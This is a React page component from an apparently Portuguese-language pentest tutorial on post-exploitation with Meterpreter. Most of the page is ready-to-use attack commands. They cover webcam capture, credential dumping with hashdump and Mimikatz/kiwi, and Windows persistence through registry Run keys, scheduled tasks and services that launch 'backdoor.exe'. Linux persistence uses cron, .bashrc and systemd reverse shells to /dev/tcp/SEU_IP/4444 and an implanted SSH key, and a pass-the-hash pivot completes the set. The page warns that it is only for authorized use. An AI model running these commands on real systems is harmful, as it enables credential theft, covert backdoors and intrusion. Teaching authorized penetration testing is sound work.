import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function PostExploracao() {
    return (
      <PageContainer
        title="Pós-Exploração — Meterpreter e Técnicas"
        subtitle="O que fazer depois de comprometer um sistema: persistência, coleta de dados e movimentação lateral."
        difficulty="avancado"
        timeToRead="18 min"
      >
        <AlertBox type="danger" title="Uso restrito a ambientes autorizados">
          Pós-exploração sem autorização é crime. Use apenas em labs, CTFs e pentests com escopo definido.
        </AlertBox>

        <h2>Meterpreter — Comandos Essenciais</h2>
        <CodeBlock language="bash" code={'# Após estabelecer sessão Meterpreter:\nsessions -l           # listar sessões\nsessions -i 1         # interagir com sessão 1\n\n# Informações do sistema\nsysinfo\ngetuid\ngetpid\ngetsystem             # tentar escalar para SYSTEM\n\n# Shell do sistema\nshell\n\n# Upload e download\nupload /root/evil.exe C:\\\\Users\\\\Public\\\\evil.exe\ndownload C:\\\\Users\\\\admin\\\\passwords.txt /tmp/\n\n# Navegação de arquivos\npwd\nls\ncd C:\\\\Users\\\\admin\n\n# Captura de tela\nscreenshot\n\n# Webcam\nwebcam_list\nwebcam_snap -i 1'} />

        <h2>Coleta de Credenciais (Windows)</h2>
        <CodeBlock language="bash" code={'# Dentro do Meterpreter (após getsystem):\nhashdump              # extrair hashes SAM\nrun post/windows/gather/hashdump\nrun post/windows/gather/credentials/credential_collector\n\n# Kiwi (Mimikatz embutido no Meterpreter)\nload kiwi\nkiwi_cmd sekurlsa::logonpasswords\ncreds_all             # todos os tipos de credenciais\nlsa_dump_sam\nlsa_dump_secrets'} />

        <h2>Persistência no Windows</h2>
        <CodeBlock language="bash" code={'# Módulo de persistência do Metasploit\nrun post/windows/manage/persistence_exe\n  STARTUP=REGISTRY\n  SESSION=1\n\n# Registro (manual)\nreg setval -k "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" \\\n  -v "Updater" -d "C:\\\\Windows\\\\Temp\\\\backdoor.exe"\n\n# Tarefa agendada\nschtasks /create /sc onlogon /tn "Updater" /tr "C:\\backdoor.exe" /ru SYSTEM\n\n# Service\nsc create "WindowsUpdater" binPath= "C:\\backdoor.exe" start= auto\nsc start WindowsUpdater'} />

        <h2>Persistência no Linux</h2>
        <CodeBlock language="bash" code={'# Crontab reverso shell\n(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/SEU_IP/4444 0>&1") | crontab -\n\n# ~/.bashrc ou ~/.profile\necho "bash -i >& /dev/tcp/SEU_IP/4444 0>&1" >> ~/.bashrc\n\n# Chave SSH\nmkdir -p ~/.ssh\necho "SUA_CHAVE_PUBLICA" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# Serviço systemd (se root)\ncat > /etc/systemd/system/updater.service << EOF\n[Unit]\nDescription=System Updater\n[Service]\nExecStart=/bin/bash -c \'bash -i >& /dev/tcp/SEU_IP/4444 0>&1\'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable updater --now'} />

        <h2>Movimentação Lateral (Pivoting)</h2>
        <CodeBlock language="bash" code={'# Adicionar rota via Meterpreter\nroute add 10.10.10.0/24 1  # rota para sessão 1\n\n# SOCKS proxy via Metasploit\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j\n\n# Usar proxychains com o proxy do Metasploit\nproxychains nmap -sT -Pn 10.10.10.0/24\n\n# Pass-the-Hash\nuse exploit/windows/smb/psexec\nset SMBUser admin\nset SMBPass aad3b435b51404eeaad3b435b51404ee:HASH_NT\nrun'} />

        <AlertBox type="success" title="Documentar tudo!">
          Em um pentest profissional, cada ação pós-exploração deve ser documentada:
          screenshotado, logado com timestamps e descrito no relatório final.
          Nunca modifique dados de produção durante um pentest!
        </AlertBox>
      </PageContainer>
    );
  }
  